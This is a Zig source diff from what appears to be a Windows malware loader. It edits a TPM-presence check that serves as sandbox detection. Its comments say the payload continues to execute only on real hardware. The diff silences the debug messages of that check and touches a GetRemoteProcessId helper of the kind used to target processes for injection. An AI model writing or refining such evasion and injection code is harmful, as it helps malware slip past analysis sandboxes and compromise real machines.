@@ -5,6 +5,7 @@ const WINAPI = windows.WINAPI;
 const HANDLE = windows.HANDLE;
 const DWORD = windows.DWORD;
 const BOOL = windows.BOOL;
+const isDebug = windows.BOOL;
 
 pub extern "kernel32" fn CreateFileA(
     lpFileName: ?[*:0]const u8,
@@ -152,15 +153,15 @@ pub fn checkTPMPresence() bool {
     );
 
     if (h_device == TPM_INVALID_HANDLE) {
-        std.debug.print("TPM device not found - possible sandbox environment\n", .{}); // this likely a sandbox
+        // std.debug.print("TPM device not found - possible sandbox environment\n", .{}); // this likely a sandbox
         return false;
     }
 
     defer {
-        _ = windows.kernel32.CloseHandle(h_device.?);
+        _ = windows.CloseHandle(h_device.?);
     }
 
-    std.debug.print("TPM device found - likely real hardware\n", .{}); // alright found! then continue executing the payload
+    // std.debug.print("TPM device found - likely real hardware\n", .{}); // alright found! then continue executing the payload
     return true;
 }
 pub fn GetRemoteProcessId(process_name: []const u16) anyerror!windows.DWORD {
@@ -174,7 +175,7 @@ pub fn GetRemoteProcessId(process_name: []const u16) anyerror!windows.DWORD {
     //     return 0;
     //  }
     //{
-    defer _ = windows.kernel32.CloseHandle(snapshot_handle);
+    defer _ = windows.CloseHandle(snapshot_handle);
     //  }
     process_entry.dwSize = @sizeOf(PROCESSENTRY32W);
 
